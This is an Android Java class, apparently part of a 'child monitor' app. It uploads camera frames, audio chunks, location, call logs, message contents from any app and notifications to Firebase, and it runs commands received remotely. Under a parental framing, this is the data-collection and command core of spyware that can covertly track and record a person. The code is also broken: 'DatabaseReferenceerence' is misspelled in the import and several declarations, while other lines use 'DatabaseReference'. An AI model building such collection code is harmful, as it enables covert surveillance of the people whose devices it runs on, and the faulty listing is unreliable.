package com.monitor.child.manager;

import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.Task;
import com.google.android.gms.tasks.Tasks;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReferenceerence;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.monitor.child.utils.Constants;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class FirebaseManager {
    private static final String TAG = "FirebaseManager";
    private static FirebaseManager instance;
    private FirebaseAuth mAuth;
    private FirebaseDatabase mDatabase;
    private FirebaseStorage mStorage;
    private String currentEmail;
    private OnCommandListener commandListener;
    private ValueEventListener commandListenerRef;

    private FirebaseManager() {
        mAuth = FirebaseAuth.getInstance();
        mDatabase = FirebaseDatabase.getInstance();
        mStorage = FirebaseStorage.getInstance();
    }

    public static synchronized FirebaseManager getInstance() {
        if (instance == null) {
            instance = new FirebaseManager();
        }
        return instance;
    }

    public FirebaseAuth getAuth() {
        return mAuth;
    }

    public String getCurrentEmail() {
        return currentEmail;
    }

    public String getSanitizedEmail() {
        if (currentEmail == null) return "unknown";
        return currentEmail.replace(".", "_").replace("@", "_at_");
    }

    public Task<FirebaseUser> signInWithEmail(String email, String password) {
        return mAuth.signInWithEmailAndPassword(email, password)
                .continueWith(task -> {
                    if (task.isSuccessful()) {
                        currentEmail = email;
                        startListeningForCommands();
                    }
                    return mAuth.getCurrentUser();
                });
    }

    public Task<FirebaseUser> createAccount(String email, String password) {
        return mAuth.createUserWithEmailAndPassword(email, password)
                .continueWith(task -> {
                    if (task.isSuccessful()) {
                        currentEmail = email;
                        initDeviceNode();
                        startListeningForCommands();
                    }
                    return mAuth.getCurrentUser();
                });
    }

    private void initDeviceNode() {
        String sanitized = getSanitizedEmail();
        DatabaseReferenceerence deviceRef = mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized);

        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("lastSeen", System.currentTimeMillis());
        deviceInfo.put("deviceType", "android_child");
        deviceInfo.put("status", "online");

        deviceRef.setValue(deviceInfo);
    }

    public void uploadCameraFrame(byte[] jpegData) {
        String sanitized = getSanitizedEmail();
        String fileName = "frame_" + System.currentTimeMillis() + ".jpg";
        StorageReference ref = mStorage.getReference()
                .child(Constants.STORAGE_CAMERA_PATH)
                .child(sanitized)
                .child(fileName);

        ref.putBytes(jpegData)
                .addOnSuccessListener(task -> {
                    Log.d(TAG, "Camera frame uploaded: " + fileName);
                    updateLastSeen();
                })
                .addOnFailureListener(e -> Log.e(TAG, "Upload failed: " + e.getMessage()));
    }

    public void uploadAudioChunk(File audioFile) {
        String sanitized = getSanitizedEmail();
        String fileName = "audio_" + System.currentTimeMillis() + ".amr";
        StorageReference ref = mStorage.getReference()
                .child(Constants.STORAGE_AUDIO_PATH)
                .child(sanitized)
                .child(fileName);

        ref.putFile(Uri.fromFile(audioFile))
                .addOnSuccessListener(task -> {
                    Log.d(TAG, "Audio chunk uploaded: " + fileName);
                    updateLastSeen();
                })
                .addOnFailureListener(e -> Log.e(TAG, "Audio upload failed: " + e.getMessage()));
    }

    public void uploadLocation(double latitude, double longitude) {
        String sanitized = getSanitizedEmail();
        DatabaseReferenceerence locRef = mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child(Constants.STORAGE_LOCATION_PATH);

        Map<String, Object> location = new HashMap<>();
        location.put("lat", latitude);
        location.put("lng", longitude);
        location.put("timestamp", System.currentTimeMillis());

        locRef.setValue(location);

        // Also store in storage for history
        String fileName = "loc_" + System.currentTimeMillis() + ".json";
        StorageReference storageRef = mStorage.getReference()
                .child(Constants.STORAGE_LOCATION_PATH)
                .child(sanitized)
                .child(fileName);

        storageRef.putBytes(location.toString().getBytes());
    }

    public void uploadCallLog(String number, String type, long duration, long date) {
        String sanitized = getSanitizedEmail();
        DatabaseReference callRef = mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child(Constants.STORAGE_CALL_LOGS_PATH)
                .push();

        Map<String, Object> entry = new HashMap<>();
        entry.put("number", number);
        entry.put("type", type);
        entry.put("duration", duration);
        entry.put("date", date);
        callRef.setValue(entry);
        updateLastSeen();
    }

    public void uploadMessage(String from, String body, String packageName, long timestamp) {
        String sanitized = getSanitizedEmail();
        DatabaseReference msgRef = mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child(Constants.STORAGE_MESSAGES_PATH)
                .push();

        Map<String, Object> entry = new HashMap<>();
        entry.put("from", from);
        entry.put("body", body);
        entry.put("app", packageName);
        entry.put("timestamp", timestamp);
        msgRef.setValue(entry);
        updateLastSeen();
    }

    public void uploadNotification(String packageName, String title, String text, long timestamp) {
        String sanitized = getSanitizedEmail();
        DatabaseReference notifRef = mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child(Constants.STORAGE_NOTIFICATIONS_PATH)
                .push();

        Map<String, Object> entry = new HashMap<>();
        entry.put("app", packageName);
        entry.put("title", title);
        entry.put("text", text);
        entry.put("timestamp", timestamp);
        notifRef.setValue(entry);
        updateLastSeen();
    }

    private void updateLastSeen() {
        String sanitized = getSanitizedEmail();
        mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child("lastSeen")
                .setValue(System.currentTimeMillis());
    }

    public void updateStatus(String status) {
        String sanitized = getSanitizedEmail();
        mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child("status")
                .setValue(status);
    }

    public void updateCameraMode(String mode) {
        String sanitized = getSanitizedEmail();
        mDatabase.getReference(Constants.FIREBASE_CHILD_NODE)
                .child(sanitized)
                .child("cameraMode")
                .setValue(mode);
    }

    private void startListeningForCommands() {
        if (commandListenerRef != null) {
            stopListeningForCommands();
        }

        String sanitized = getSanitizedEmail();
        DatabaseReferenceerence cmdRef = mDatabase.getReference(Constants.FIREBASE_COMMANDS_NODE)
                .child(sanitized);

        commandListenerRef = cmdRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (commandListener != null) {
                    for (DataSnapshot child : snapshot.getChildren()) {
                        String command = child.getValue(String.class);
                        if (command != null) {
                            commandListener.onCommandReceived(command);
                            child.getRef().removeValue();
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Command listener cancelled: " + error.getMessage());
            }
        });
    }

    private void stopListeningForCommands() {
        if (commandListenerRef != null) {
            String sanitized = getSanitizedEmail();
            mDatabase.getReference(Constants.FIREBASE_COMMANDS_NODE)
                    .child(sanitized)
                    .removeEventListener(commandListenerRef);
            commandListenerRef = null;
        }
    }

    public void setOnCommandListener(OnCommandListener listener) {
        this.commandListener = listener;
    }

    public interface OnCommandListener {
        void onCommandReceived(String command);
    }

    public void cleanup() {
        stopListeningForCommands();
        updateStatus("offline");
    }
}
